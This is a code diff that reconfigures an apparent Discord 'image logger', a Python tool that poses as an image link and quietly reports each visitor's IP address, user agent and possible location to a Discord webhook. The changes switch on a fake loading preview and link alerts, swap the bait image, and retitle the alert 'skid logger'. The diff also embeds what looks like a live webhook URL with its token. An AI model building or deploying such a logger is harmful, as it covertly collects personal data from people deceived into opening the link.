@@ -5,12 +5,12 @@ import traceback, requests, base64, httpagentparser
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1373770368841547826/A9LzllreRadqzyg4mJ6YMkSCzOfwcdDADw7-CQS2LhOXn5VqZ75kK-kYO3SJwluoCjLM",
-    "image": "https://i.imgur.com/vajd5UA.jpeg", # You can also have a custom image by using a URL argument
+    "image": "https://imgs.search.brave.com/nWu1GRcHBGf-ldmqVsBFUUmGEmmJkK5md0Wq5XxbWcA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pLnJl/ZGQuaXQvYmF3ZjZu/aWhiMGFjMS5qcGVn", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "eziii", # Set this to the name you want the webhook to have
+    "username": "ip logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -29,8 +29,8 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
@@ -136,9 +136,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "pwned",
+            "title": "skid logger",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**someone was skidded**
 
 **Endpoint:** `{endpoint}`
             
